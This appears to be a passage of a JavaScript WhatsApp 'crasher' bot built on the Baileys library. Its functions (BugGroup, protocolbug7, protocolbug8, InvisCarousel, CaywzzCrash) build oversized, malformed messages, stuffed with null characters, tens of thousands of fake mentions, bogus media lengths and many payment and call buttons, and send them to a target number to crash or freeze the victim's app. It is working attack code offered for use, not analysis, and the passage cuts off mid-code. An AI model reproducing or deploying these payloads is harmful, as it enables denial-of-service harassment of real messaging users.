                             title: "🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "💔" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await cay.sendMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await cay.sendMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "⟅̊🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ▾" },
                             content: undefined
}
]
}
);
}
}

async function BugGroup(jid, count) {
  for (let i = 0; i < count; i++) {
    const messageContent = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⟅̊🦠 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟ ▾ ",
              hasMediaAttachment: false
            },
            body: {
              text: "\u0003".repeat(9000),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                { name: "single_select", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_method", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "call_permission_request", buttonParamsJson: GetsuVoidsTravasX + "\u0003", voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "wa_payment_learn_more", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "wa_payment_transaction_details", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "wa_payment_fbpin_reset", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "catalog_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_info", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "review_order", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "send_location", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payments_care_csat", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "view_product", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_settings", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "address_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "automated_greeting_message_view_catalog", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "open_webview", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "message_with_link_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "galaxy_costum", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "extensions_message_v2", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "landline_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "mpm", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "cta_copy", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "cta_url", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "review_and_pay", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "galaxy_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "cta_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" }
              ]
            }
          }
        }
      }
    }, {});

    await cay.relayMessage(jid, messageContent.message, {
      messageId: messageContent.key.id
    });

    console.log(chalk.red(`Sukses kirim BugViewOnce ke ${jid}`));
  }
}
async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "caywzz"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await cay.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await cay.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function protocolbug8(target, mention = true) {
const nativeFlowResponseMessage = 'some value'; // atau import jika dari file lain
const CrashAPI = "https://www.instagram.com/_u/api_crash_image_raldzz_";

const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "🪐" + "ꦾ".repeat(9511),
        title: "This Was Caywzz.",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: CrashAPI,
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
    
   nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1044000),
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1044000),
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1044000),
                 version: 3
                        }};

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "1099511627776000",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           nativeFlowResponseMessage,
           externalAdReply: {
              showAdAttribution: true,
              title: `🪐`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: {
         extendedTextMessage: {
                text: "᭯".repeat(999),
                matchedText: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
                canonicalUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
               description: "\u0000".repeat(999),
                title: "\u0000".repeat(999),
                previewType: "NONE",
                jpegThumbnail: Buffer.alloc(10000), 
         contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
         externalAdReply: {
                showAdAttribution: true,
                title: "\u0000".repeat(999),
                body: "\u0000".repeat(999),
                thumbnailUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999)
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
         paymentInviteMessage: {
                currencyCodeIso4217: "USD",
                amount1000: 999999999,
                expiryTimestamp: null,
                inviteMessage: "\u0000".repeat(999),
                serviceType: 1
            }
        },
            isSampled: true,
            mentionedJid: [
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
        )
            ]
                      
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: `WaysModzz || Crasher`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await cay.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await cay.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

    async function sendViewOnceMessages2(jid, count) {
			for (let i = 0; i < count; i++) {
			let messageContent = generateWAMessageFromContent(jid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "caywzzaja",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "🌌"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
				cay.relayMessage(jid, messageContent.message, {
					'messageId': messageContent.key.id
				});
			}
		}

		async function InvisCarousel(target) {
const imagePayload = await prepareWAMessageMedia({
image: { url: 'https://files.catbox.moe/171u4t.jpg', gifPlayback: true }
}, {
upload: cay.waUploadToServer,
mediaType: "image"
});
const cards = Array.from({ length: 5 }).map((_, i) => ({
header: {
title: namebug1 + ` ${i + 1}`,
hasMediaAttachment: true,
imageMessage: imagePayload.imageMessage
},
body: { text: "\u0000".repeat(300) },
nativeFlowMessage: {
buttons: [{
name: "review_order",
buttonParamsJson: JSON.stringify({
reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
order: {
status: "completed",
order_type: "ORDER"
},
share_payment_status: true
})}],
messageParamsJson: {}
}}));
const msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "" },
footer: { text: "" },
carouselMessage: { cards }
}}}}, {}
);
await cay.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}]}]}]});
}
		async function CaywzzCrash(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '@caywzz',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "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